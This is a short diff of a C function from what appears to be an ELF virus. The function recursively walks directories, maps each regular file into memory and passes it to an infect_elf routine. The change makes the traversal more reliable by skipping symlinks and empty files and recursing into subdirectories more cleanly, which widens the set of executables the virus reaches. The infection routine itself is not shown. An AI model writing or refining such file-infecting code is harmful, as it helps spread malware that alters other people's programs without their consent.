@@ -117,25 +117,23 @@ void	process_file(char *name, char *path)
 	int				fd;
 	struct stat		buf;
 	void			*ptr;
-	DIR				*test_dir;
 
-	if ((fd = open(path, O_RDONLY) < 0))
+	(void)name;
+	if (lstat(path, &buf) == -1)
 		return ;
-	if (fstat(fd, &buf) < 0)
-		return ((void)close(fd));
-	if (!strcmp(".", name) || !strcmp("..", name))
-		return ((void)close(fd));
-	if ((test_dir = opendir(path)))
-	{
-		closedir(test_dir);
-		close(fd);
+	if (S_ISLNK(buf.st_mode))
+		return ;
+	if (S_ISDIR(buf.st_mode))
 		return (process_directory(path));
-	}
+	fd = open(path, O_RDONLY);
+	if (fd < 0)
+		return ;
 	if (!S_ISREG(buf.st_mode))
 		return ((void)close(fd));
-	if (buf.st_size < 0)
+	if (buf.st_size <= 0)
 		return ((void)close(fd));
-	if ((ptr = mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+	ptr = mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+	if (ptr == MAP_FAILED)
 		return ((void)close(fd));
 	init_check_address(ptr, buf.st_size);
 	infect_elf(ptr, path);
